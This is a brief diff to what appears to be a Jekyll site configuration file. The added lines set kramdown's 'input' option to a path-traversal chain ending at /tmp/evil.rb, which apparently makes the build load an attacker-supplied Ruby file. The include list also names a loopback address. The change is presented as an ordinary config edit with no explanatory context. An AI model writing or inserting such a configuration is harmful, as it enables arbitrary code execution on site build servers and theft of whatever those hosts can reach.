@@ -48,6 +48,10 @@ include:
     - jekyll-pages/main.md
     - http://127.0.0.1:9090
 
+markdown: kramdown
+kramdown: 
+    input: ../../../../../../../../../../../../../../../tmp/evil.rb
+
 # Exclude from processing.
 # The following items will not be processed, by default.
 # Any item listed under the `exclude:` key here will be automatically added to
